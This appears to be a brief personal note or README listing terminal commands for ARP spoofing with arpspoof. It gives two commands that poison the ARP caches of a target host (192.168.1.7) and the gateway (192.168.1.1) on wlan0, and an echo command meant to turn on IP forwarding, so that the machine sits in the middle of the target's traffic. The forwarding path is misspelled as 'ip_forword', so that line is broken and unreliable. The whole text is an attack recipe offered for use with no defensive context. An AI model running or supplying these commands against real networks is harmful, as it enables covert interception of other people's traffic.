# arpspoof

arpspoof terminal commands:

                       targetip    spoofip
arpspoof -i wlan0 -t 192.168.1.7  192.168.1.1

                        spoofip    targetip 
arpspoof -i wlan0 -t 192.168.1.1  192.168.1.7

echo 1 > /proc/sys/net/ipv4/ip_forword



